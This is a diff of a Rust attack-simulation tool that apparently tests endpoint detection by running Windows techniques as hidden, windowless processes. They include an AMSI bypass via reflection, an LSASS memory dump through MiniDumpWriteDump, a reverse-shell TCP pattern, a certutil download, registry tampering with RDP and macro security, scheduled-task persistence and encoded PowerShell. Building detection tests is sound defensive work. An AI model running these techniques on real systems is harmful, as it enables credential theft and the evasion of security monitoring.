@@ -54,33 +54,7 @@ fn reset_scenarios() -> Result<(), String> {
 }
 
 #[cfg(target_os = "windows")]
-fn run_ps1_script(script_content: &str) -> Result<std::process::Output, String> {
-    use std::fs;
-    let script_path = std::env::temp_dir().join(format!("{}.ps1", uuid::Uuid::new_v4()));
-    fs::write(&script_path, script_content).map_err(|e| e.to_string())?;
-    let output = std::process::Command::new("powershell.exe")
-        .args([
-            "-ExecutionPolicy", "Bypass",
-            "-NoProfile",
-            "-File", &script_path.to_string_lossy(),
-        ])
-        .output()
-        .map_err(|e| e.to_string());
-    let _ = fs::remove_file(&script_path);
-    output
-}
-
-#[cfg(target_os = "windows")]
-fn run_cmd(program: &str, args: &[&str]) -> Result<std::process::Output, String> {
-    let mut all_args = vec!["/c", program];
-    all_args.extend_from_slice(args);
-    std::process::Command::new("cmd.exe")
-        .args(&all_args)
-        .output()
-        .map_err(|e| e.to_string())
-}
-
-// --- Scenario 1: Certutil SAM Dump ---
+const CREATE_NO_WINDOW: u32 = 0x08000000;
 
 #[cfg(target_os = "windows")]
 fn run_certutil_dump() -> Result<String, String> {
@@ -88,11 +62,11 @@ fn run_certutil_dump() -> Result<String, String> {
     let tmp = std::env::temp_dir().join(format!("{}.txt", uuid::Uuid::new_v4()));
     let tmp_out = std::env::temp_dir().join(format!("{}.b64", uuid::Uuid::new_v4()));
     fs::write(&tmp, "SIMULATED SAM DUMP DATA - NTLM HASHES").map_err(|e| e.to_string())?;
-    let output = run_cmd("certutil", &[
-        "-encode",
-        &tmp.to_string_lossy(),
-        &tmp_out.to_string_lossy(),
-    ])?;
+    let output = std::process::Command::new("certutil")
+        .args(["-encode", &tmp.to_string_lossy(), &tmp_out.to_string_lossy()])
+        .creation_flags(CREATE_NO_WINDOW)
+        .output()
+        .map_err(|e| e.to_string())?;
     let _ = fs::remove_file(&tmp);
     let _ = fs::remove_file(&tmp_out);
     if output.status.success() {
@@ -108,26 +82,31 @@ fn run_certutil_dump() -> Result<String, String> {
     Ok("Mock: certutil -encode blocked by SentinelOne (macOS dev mode)".to_string())
 }
 
-// --- Scenario 2: RDP Enable via Registry ---
-
 #[cfg(target_os = "windows")]
 fn run_rdp_enable() -> Result<String, String> {
-    let output = run_cmd("reg", &[
-        "add",
-        r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server",
-        "/v", "fDenyTSConnections",
-        "/t", "REG_DWORD",
-        "/d", "0",
-        "/f",
-    ])?;
-    let _ = run_cmd("reg", &[
-        "add",
-        r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server",
-        "/v", "fDenyTSConnections",
-        "/t", "REG_DWORD",
-        "/d", "1",
-        "/f",
-    ]);
+    let output = std::process::Command::new("reg")
+        .args([
+            "add",
+            r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server",
+            "/v", "fDenyTSConnections",
+            "/t", "REG_DWORD",
+            "/d", "0",
+            "/f",
+        ])
+        .creation_flags(CREATE_NO_WINDOW)
+        .output()
+        .map_err(|e| e.to_string())?;
+    let _ = std::process::Command::new("reg")
+        .args([
+            "add",
+            r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server",
+            "/v", "fDenyTSConnections",
+            "/t", "REG_DWORD",
+            "/d", "1",
+            "/f",
+        ])
+        .creation_flags(CREATE_NO_WINDOW)
+        .output();
     if output.status.success() {
         Ok("RDP enable via reg add executed, then immediately reverted".to_string())
     } else {
@@ -141,17 +120,16 @@ fn run_rdp_enable() -> Result<String, String> {
     Ok("Mock: RDP enable via reg add blocked by SentinelOne (macOS dev mode)".to_string())
 }
 
-// --- Scenario 3: AMSI Memory Patch ---
-
 #[cfg(target_os = "windows")]
 fn run_amsi_patch() -> Result<String, String> {
-    let script = r#"
-$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-$f = $a.GetField('amsiContext', 'NonPublic,Static')
-$f.SetValue($null, [IntPtr]::Zero)
-Write-Host "AMSI patch attempted"
-"#;
-    let output = run_ps1_script(script)?;
+    let output = std::process::Command::new("powershell.exe")
+        .args([
+            "-NoProfile", "-WindowStyle", "Hidden", "-Command",
+            "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiContext','NonPublic,Static');$f.SetValue($null,[IntPtr]::Zero);Write-Host 'AMSI patch attempted'",
+        ])
+        .creation_flags(CREATE_NO_WINDOW)
+        .output()
+        .map_err(|e| e.to_string())?;
     if output.status.success() {
         Ok("AMSI in-memory patch attempted via Reflection".to_string())
     } else {
@@ -165,34 +143,18 @@ fn run_amsi_patch() -> Result<String, String> {
     Ok("Mock: AMSI memory patch blocked by SentinelOne (macOS dev mode)".to_string())
 }
 
-// --- Scenario 4: LSASS Minidump ---
-
 #[cfg(target_os = "windows")]
 fn run_lsass_minidump() -> Result<String, String> {
     let dump_path = std::env::temp_dir().join(format!("{}.dmp", uuid::Uuid::new_v4()));
-    let script = format!(r#"
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class MiniDump {{
-    [DllImport("dbghelp.dll", SetLastError = true)]
-    public static extern bool MiniDumpWriteDump(
-        IntPtr hProcess, uint ProcessId, IntPtr hFile,
-        uint DumpType, IntPtr ExceptionParam,
-        IntPtr UserStreamParam, IntPtr CallbackParam);
-}}
-"@
-
-$proc = Get-Process lsass
-$file = [IO.File]::Create('{}')
-$result = [MiniDump]::MiniDumpWriteDump(
-    $proc.Handle, $proc.Id,
-    $file.SafeFileHandle.DangerousGetHandle(),
-    2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
-$file.Close()
-Write-Host "LSASS dump attempted, result: $result"
-"#, dump_path.to_string_lossy());
-    let output = run_ps1_script(&script)?;
+    let script = format!(
+        "Add-Type -TypeDefinition @\"\nusing System;using System.Runtime.InteropServices;\npublic class MiniDump{{{{\n[DllImport(\"dbghelp.dll\",SetLastError=true)]\npublic static extern bool MiniDumpWriteDump(IntPtr hProcess,uint ProcessId,IntPtr hFile,uint DumpType,IntPtr ExceptionParam,IntPtr UserStreamParam,IntPtr CallbackParam);\n}}}}\n\"@;\n$p=Get-Process lsass;$f=[IO.File]::Create('{}');\n$r=[MiniDump]::MiniDumpWriteDump($p.Handle,$p.Id,$f.SafeFileHandle.DangerousGetHandle(),2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero);\n$f.Close();Write-Host \"LSASS dump result: $r\"",
+        dump_path.to_string_lossy()
+    );
+    let output = std::process::Command::new("powershell.exe")
+        .args(["-NoProfile", "-WindowStyle", "Hidden", "-Command", &script])
+        .creation_flags(CREATE_NO_WINDOW)
+        .output()
+        .map_err(|e| e.to_string())?;
     let _ = std::fs::remove_file(&dump_path);
     if output.status.success() {
         Ok("LSASS minidump attempted via MiniDumpWriteDump P/Invoke".to_string())
@@ -207,38 +169,14 @@ fn run_lsass_minidump() -> Result<String, String> {
     Ok("Mock: LSASS minidump blocked by SentinelOne (macOS dev mode)".to_string())
 }
 
-// --- Scenario 5: Reverse Shell (TCP) ---
-
 #[cfg(target_os = "windows")]
 fn run_reverse_shell() -> Result<String, String> {
-    let script = r#"
-function Test-NetworkConnectivity {
-    param(
-        [string]$TargetHost = '127.0.0.1',
-        [int]$TargetPort = 4444
-    )
-    $ErrorActionPreference = 'SilentlyContinue'
-    try {
-        $socket = New-Object Net.Sockets.TCPClient($TargetHost, $TargetPort)
-        $netStream = $socket.GetStream()
-        $reader = New-Object System.IO.StreamReader($netStream)
-        $writer = New-Object System.IO.StreamWriter($netStream)
-        $writer.AutoFlush = $true
-        $writer.WriteLine("whoami")
-        $response = $reader.ReadLine()
-        $result = Invoke-Expression "Write-Output '$response'" 2>&1 | Out-String
-        Write-Host $result
-    }
-    catch {
-        Write-Host "Connection test completed with expected failure"
-    }
-    finally {
-        if ($socket) { $socket.Close() }
-    }
-}
-Test-NetworkConnectivity
-"#;
-    let output = run_ps1_script(script)?;
+    let script = r#"function Test-NetworkConnectivity{param([string]$TargetHost='127.0.0.1',[int]$TargetPort=4444);$ErrorActionPreference='SilentlyContinue';try{$socket=New-Object Net.Sockets.TCPClient($TargetHost,$TargetPort);$netStream=$socket.GetStream();$reader=New-Object System.IO.StreamReader($netStream);$writer=New-Object System.IO.StreamWriter($netStream);$writer.AutoFlush=$true;$writer.WriteLine('whoami');$response=$reader.ReadLine();$result=Invoke-Expression "Write-Output '$response'" 2>&1|Out-String;Write-Host $result}catch{Write-Host 'Connection test completed with expected failure'}finally{if($socket){$socket.Close()}}};Test-NetworkConnectivity"#;
+    let output = std::process::Command::new("powershell.exe")
+        .args(["-NoProfile", "-WindowStyle", "Hidden", "-Command", script])
+        .creation_flags(CREATE_NO_WINDOW)
+        .output()
+        .map_err(|e| e.to_string())?;
     if output.status.success() {
         Ok("Reverse shell TCP pattern executed (StreamReader + Invoke-Expression)".to_string())
     } else {
@@ -252,17 +190,22 @@ fn run_reverse_shell() -> Result<String, String> {
     Ok("Mock: Reverse shell connection blocked by SentinelOne (macOS dev mode)".to_string())
 }
 
-// --- Scenario 6: Scheduled Task Persistence ---
-
 #[cfg(target_os = "windows")]
 fn run_persistence_task() -> Result<String, String> {
     let task_name = format!("GuardzTest_{}", &uuid::Uuid::new_v4().to_string()[..8]);
-    let output = run_cmd("schtasks", &[
-        "/create", "/tn", &task_name,
-        "/tr", "cmd.exe /c echo GuardzTest",
-        "/sc", "once", "/st", "23:59", "/f",
-    ])?;
-    let _ = run_cmd("schtasks", &["/delete", "/tn", &task_name, "/f"]);
+    let output = std::process::Command::new("schtasks")
+        .args([
+            "/create", "/tn", &task_name,
+            "/tr", "cmd.exe /c echo GuardzTest",
+            "/sc", "once", "/st", "23:59", "/f",
+        ])
+        .creation_flags(CREATE_NO_WINDOW)
+        .output()
+        .map_err(|e| e.to_string())?;
+    let _ = std::process::Command::new("schtasks")
+        .args(["/delete", "/tn", &task_name, "/f"])
+        .creation_flags(CREATE_NO_WINDOW)
+        .output();
     if output.status.success() {
         Ok("Scheduled task created and immediately deleted".to_string())
     } else {
@@ -276,17 +219,14 @@ fn run_persistence_task() -> Result<String, String> {
     Ok("Mock: Scheduled task persistence blocked by SentinelOne (macOS dev mode)".to_string())
 }
 
-// --- Scenario 7: Base64 Encoded Execution ---
-
 #[cfg(target_os = "windows")]
 fn run_base64_exec() -> Result<String, String> {
-    let script = r#"
-$code = "Get-Process; whoami; Get-Service | Select-Object -First 5"
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($code)
-$encoded = [Convert]::ToBase64String($bytes)
-powershell.exe -EncodedCommand $encoded
-"#;
-    let output = run_ps1_script(script)?;
+    let script = "$code='Get-Process;whoami;Get-Service|Select-Object -First 5';$bytes=[System.Text.Encoding]::Unicode.GetBytes($code);$encoded=[Convert]::ToBase64String($bytes);powershell.exe -EncodedCommand $encoded";
+    let output = std::process::Command::new("powershell.exe")
+        .args(["-NoProfile", "-WindowStyle", "Hidden", "-Command", script])
+        .creation_flags(CREATE_NO_WINDOW)
+        .output()
+        .map_err(|e| e.to_string())?;
     if output.status.success() {
         Ok("Base64-encoded PowerShell command executed via -EncodedCommand".to_string())
     } else {
@@ -300,24 +240,29 @@ fn run_base64_exec() -> Result<String, String> {
     Ok("Mock: Base64-encoded PowerShell blocked by SentinelOne (macOS dev mode)".to_string())
 }
 
-// --- Scenario 8: Office Macro Security Tamper ---
-
 #[cfg(target_os = "windows")]
 fn run_macro_tamper() -> Result<String, String> {
-    let output = run_cmd("reg", &[
-        "add",
-        r"HKCU\Software\Microsoft\Office\16.0\Word\Security",
-        "/v", "VBAWarnings",
-        "/t", "REG_DWORD",
-        "/d", "1",
-        "/f",
-    ])?;
-    let _ = run_cmd("reg", &[
-        "delete",
-        r"HKCU\Software\Microsoft\Office\16.0\Word\Security",
-        "/v", "VBAWarnings",
-        "/f",
-    ]);
+    let output = std::process::Command::new("reg")
+        .args([
+            "add",
+            r"HKCU\Software\Microsoft\Office\16.0\Word\Security",
+            "/v", "VBAWarnings",
+            "/t", "REG_DWORD",
+            "/d", "1",
+            "/f",
+        ])
+        .creation_flags(CREATE_NO_WINDOW)
+        .output()
+        .map_err(|e| e.to_string())?;
+    let _ = std::process::Command::new("reg")
+        .args([
+            "delete",
+            r"HKCU\Software\Microsoft\Office\16.0\Word\Security",
+            "/v", "VBAWarnings",
+            "/f",
+        ])
+        .creation_flags(CREATE_NO_WINDOW)
+        .output();
     if output.status.success() {
         Ok("Office macro security registry modified, then reverted".to_string())
     } else {
@@ -331,16 +276,18 @@ fn run_macro_tamper() -> Result<String, String> {
     Ok("Mock: Office macro tampering blocked by SentinelOne (macOS dev mode)".to_string())
 }
 
-// --- Scenario 9: LOLBin File Download ---
-
 #[cfg(target_os = "windows")]
 fn run_lotl_download() -> Result<String, String> {
     let tmp = std::env::temp_dir().join(format!("{}.tmp", uuid::Uuid::new_v4()));
-    let output = run_cmd("certutil", &[
-        "-urlcache", "-split", "-f",
-        "http://192.0.2.1/test.txt",
-        &tmp.to_string_lossy(),
-    ])?;
+    let output = std::process::Command::new("certutil")
+        .args([
+            "-urlcache", "-split", "-f",
+            "http://192.0.2.1/test.txt",
+            &tmp.to_string_lossy(),
+        ])
+        .creation_flags(CREATE_NO_WINDOW)
+        .output()
+        .map_err(|e| e.to_string())?;
     let _ = std::fs::remove_file(&tmp);
     if output.status.success() {
         Ok("LOLBin file download via certutil attempted".to_string())
@@ -355,19 +302,18 @@ fn run_lotl_download() -> Result<String, String> {
     Ok("Mock: certutil LOLBin download blocked by SentinelOne (macOS dev mode)".to_string())
 }
 
-// --- Scenario 10: BloodHound Reconnaissance ---
-
 #[cfg(target_os = "windows")]
 fn run_bloodhound_recon() -> Result<String, String> {
     let fake_out = std::env::temp_dir().join("bloodhound_test.txt");
-    let script = format!(r#"
-$fakeOut = "{}"
-$harmless = "echo benign > `"$fakeOut`""
-$bhCmd = "Invoke-BloodHound -CollectionMethod All -Domain CONTOSO.LOCAL; Get-BloodHoundData; $harmless"
-Start-Process -FilePath "powershell.exe" -ArgumentList "-Command $bhCmd" -WindowStyle Hidden -Wait
-Write-Host "BloodHound execution emulation completed safely."
-"#, fake_out.to_string_lossy());
-    let output = run_ps1_script(&script)?;
+    let script = format!(
+        "$fakeOut='{}';$harmless=\"echo benign > `\"$fakeOut`\"\";$bhCmd=\"Invoke-BloodHound -CollectionMethod All -Domain CONTOSO.LOCAL; Get-BloodHoundData; $harmless\";Start-Process -FilePath 'powershell.exe' -ArgumentList \"-Command $bhCmd\" -WindowStyle Hidden -Wait;Write-Host 'BloodHound execution emulation completed safely.'",
+        fake_out.to_string_lossy()
+    );
+    let output = std::process::Command::new("powershell.exe")
+        .args(["-NoProfile", "-WindowStyle", "Hidden", "-Command", &script])
+        .creation_flags(CREATE_NO_WINDOW)
+        .output()
+        .map_err(|e| e.to_string())?;
     let _ = std::fs::remove_file(&fake_out);
     if output.status.success() {
         Ok("BloodHound AD reconnaissance emulation executed".to_string())
